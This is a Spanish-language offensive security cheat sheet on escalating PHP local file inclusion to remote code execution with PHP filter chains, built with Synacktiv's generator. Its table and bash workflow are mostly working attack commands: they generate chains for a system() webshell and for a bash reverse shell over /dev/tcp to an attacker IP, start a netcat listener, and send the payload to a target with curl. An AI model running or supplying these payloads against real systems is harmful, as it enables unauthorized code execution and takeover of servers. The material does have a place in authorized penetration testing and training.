---
aliases:
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI To RCE - PHP Filter Chains

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/synacktiv/php_filter_chain_generator.git` | Repo del generator de Synacktiv | Setup inicial. |
| `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` | Genera cadena `php://filter/...` que produce esa webshell | Generación de payload arbitrario. |
| `python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'` | Cadena para `phpinfo()` (probe rápido) | Confirmar RCE sin shell completo. |
| `python3 php_filter_chain_generator.py --chain '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\""); ?>'` | Cadena para reverse shell PHP | RCE con reverse shell. |
| `curl 'https://target/?page=<chain_generada>'` | Triggerear el LFI con la cadena | Ejecución. |
| `curl --data-urlencode 'page=<chain_generada>' -G https://target/` | Mismo en GET URL-encoded | Cuando chars de chain rompen URL parse. |
| Combo: `chain` apunta a `php://temp` (in-memory) | Sin archivo en disco, todo runtime | Sin requirements de paths externos. |
| Combo: `chain` apunta a `/etc/passwd` o cualquier archivo existente | Resource base + filters generan el payload encima | Atacker más flexible. |
^lfi-phpfilter

### Workflow

```bash
# 1. Confirmar LFI con php://filter funcional
TARGET="https://target/?page="
curl -s "${TARGET}php://filter/convert.base64-encode/resource=index.php" | head

# 2. Setup generator
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator

# 3. Generar payload de prueba (probe RCE)
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv...

# 4. URL-encode + injectar
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>')
ENCODED=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$CHAIN'))")
curl -s "${TARGET}${ENCODED}&cmd=id"

# 5. Reverse shell
RS_PAYLOAD='<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""); ?>'
CHAIN=$(python3 php_filter_chain_generator.py --chain "$RS_PAYLOAD")
nc -lvnp 4444 &
curl -s "${TARGET}$(python3 -c "import urllib.parse;print(urllib.parse.quote('$CHAIN'))")"
```

### Cuándo NO funciona

- **Función vulnerable es `file_get_contents`/`readfile`** — solo lee, no ejecuta. Filter chain genera el payload pero no se interpreta.
- **`include` con append de extensión** (`.php`) — el chain termina con chars random, el `.php` final rompe el wrapper.
- **PHP < 7.0** — algunos iconv conversions no disponibles.
- **php-fpm** con `disable_classes`/`disable_functions` muy agresivo.

### Cuándo SÍ funciona

- LFI confirmado con `include()` o `require()`.
- `php://filter` no está bloqueado en la app/WAF.
- PHP ≥7.0 con iconv extension (default en la mayoría de builds).
- **NO** requiere: `allow_url_include`, escritura, archivos accesibles, log poisoning, file upload.

___

## Overview

**PHP Filter Chains** (Synacktiv 2022) = encadenar cientos de filtros `convert.iconv` para que, al consumirse el output, los bytes finales formen un payload PHP arbitrario.

Cada conversion entre charsets (ej. `UTF8 → CSISO2022KR`) introduce bytes predictibles. Encadenando ~150-300 conversions genera **cualquier secuencia de bytes deseada**.

**Por qué es revolucionaria:**
- No requiere `allow_url_include`.
- No requiere upload de archivos.
- No requiere log poisoning ni file en filesystem.
- Funciona contra cualquier `include($_GET['x'])` solo necesitando `php://filter`.

Técnica más limpia y autocontenida para LFI → RCE. Cambió el threat model de PHP filter chains casi de la noche a la mañana.

**Referencias:**
- [Synacktiv blog](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle.html)
- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

***
